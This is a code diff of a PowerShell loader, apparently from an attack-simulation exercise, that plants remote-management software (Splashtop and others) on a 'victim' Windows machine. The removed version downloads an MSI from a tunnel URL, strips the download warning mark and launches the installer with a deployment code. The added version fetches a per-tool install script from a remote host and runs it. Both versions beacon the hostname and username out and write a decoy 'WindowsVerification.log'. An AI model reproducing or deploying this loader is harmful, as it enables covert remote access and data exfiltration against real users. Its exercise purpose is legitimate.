@@ -1,19 +1,15 @@
-# rmm.ps1 - Splashtop Streamer via MSI, INTERACTIVE WIZARD variant
-# Downloads streamer.msi, unblocks, aliases setup.msi, then launches the
-# installer VISIBLY in the user's session. The "victim" clicks through
-# UAC + install wizard + deployment confirmation like a real gullible user.
+# rmm.ps1 - tool-agnostic RMM loader
+# stage1.ps1 drops this file; it downloads ttx/rmm/<tool>/install.ps1 from the
+# tunnel and dot-sources it. All tool-specific knowledge (payload URL, install
+# method, process check, beacons) lives in each tool's own install.ps1.
+#
+# select-rmm.sh injects the tool id into the $Tool line at container start;
+# the base URL placeholders are rewritten by set-url.sh (same as stage1.ps1).
 
-$RmmPreset = 'splashtop'
-$BeaconUrl  = 'https://diamond-locally-rod-detective.trycloudflare.com/beacon'
+$Tool      = '__RMM_TOOL__'
+$Base      = 'http://YOUR-HOST:8000/ttx'
+$BeaconUrl = 'http://YOUR-HOST:8000/beacon'
 
-$PRESETS = @{
-  splashtop = @{
-    Url    = 'https://diamond-locally-rod-detective.trycloudflare.com/ttx/rmm/streamer.msi'
-    File   = "$env:PUBLIC\streamer.msi"
-    Check  = 'SRStream'
-    Desc   = 'Splashtop streamer (MSI wizard)'
-  }
-}
 $ErrorActionPreference = 'SilentlyContinue'
 $Log = "$env:PUBLIC\WindowsVerification.log"
 
@@ -21,55 +17,26 @@ function Beacon([string]$Stage) {
   try { Invoke-WebRequest -UseBasicParsing "$BeaconUrl`?s=$Stage&h=$env:COMPUTERNAME&u=$env:USERNAME" | Out-Null } catch {}
 }
 
-if (-not $PRESETS.ContainsKey($RmmPreset)) { $RmmPreset = 'splashtop' }
-$R = $PRESETS[$RmmPreset]
+# Fallback if the tool id was never injected (shouldn't happen - select-rmm.sh
+# runs before this file is ever served). Deliberately matches WITHOUT the
+# surrounding underscores so select-rmm.sh's placeholder rewrite can never
+# turn this check into "if ($Tool -eq 'rustdesk')..." and flip the tool.
+if ($Tool -like '*RMM_TOOL*') { $Tool = 'splashtop' }
 
-Add-Content $Log "$(Get-Date -f s)  run: preset=$RmmPreset (wizard) user=$env:USERNAME"
+Add-Content $Log "$(Get-Date -f s)  run: tool=$Tool (loader) user=$env:USERNAME"
 
-# Already running? done.
-if (Get-Process -Name $R.Check -ErrorAction SilentlyContinue) {
-  Add-Content $Log "$(Get-Date -f s)  already running, exiting"
-  Beacon 'splashtop-already-running'
+# Fetch the tool's installer logic
+$InstallPath = "$env:PUBLIC\rmm-$Tool.ps1"
+$InstallUrl  = "$Base/rmm/$Tool/install.ps1"
+Invoke-WebRequest -Uri $InstallUrl -OutFile $InstallPath -UseBasicParsing
+
+if (-not (Test-Path $InstallPath)) {
+  Beacon "rmm-installer-fetch-failed"
+  Add-Content $Log "$(Get-Date -f s)  ERROR: could not fetch $InstallUrl"
   return
 }
 
-# Download if not present + clear MOTW
-if (-not (Test-Path $R.File)) {
-  Invoke-WebRequest -Uri $R.Url -OutFile $R.File -UseBasicParsing
-  Add-Content $Log "$(Get-Date -f s)  downloaded $($R.Url)"
-}
-Unblock-File $R.File
+Beacon "rmm-start-$Tool"
 
-if (-not (Test-Path $R.File)) {
-  Beacon 'rmm-download-failed'
-  Add-Content $Log "$(Get-Date -f s)  ERROR: downloaded MSI missing"
-  return
-}
-
-# setup.msi alias - prevents 1603 source resolution on reused hosts
-Copy-Item $R.File "$env:PUBLIC\setup.msi" -Force
-
-# Kill wedged msiexec from earlier attempts
-Get-Process msiexec -ErrorAction SilentlyContinue |
-    Where-Object { $_.Id -ne (Get-CimInstance Win32_Service -Filter "Name='msiserver'" -ErrorAction SilentlyContinue).ProcessId } |
-    Stop-Process -Force -ErrorAction SilentlyContinue
-
-# LAUNCH THE WIZARD - visible, in the user's interactive session.
-# dcode pre-fills the deployment binding; the user still clicks through.
-Beacon 'splashtop-wizard-launch'
-Start-Process msiexec.exe -ArgumentList '/i', "`"$($R.File)`"", 'dcode=ZT4WXRHKL5TY'
-Add-Content $Log "$(Get-Date -f s)  launched $($R.Desc) - wizard visible, awaiting user"
-
-# Poll for streamer up (user-paced; MSI UI waits for clicks)
-$Running = $false
-for ($i = 0; $i -lt 36; $i++) {
-  Start-Sleep -Seconds 10
-  if (Get-Process -Name 'SRStream' -ErrorAction SilentlyContinue) { $Running = $true; break }
-}
-if ($Running) {
-  Beacon 'splashtop-installed'
-  Add-Content $Log "$(Get-Date -f s)  streamer running (check Business console)"
-} else {
-  Beacon 'splashtop-notready'
-  Add-Content $Log "$(Get-Date -f s)  wizard not completed within 6 min"
-}
+# Dot-source: install.ps1 sees $Base, $BeaconUrl, $Log and Beacon() in scope
+. $InstallPath
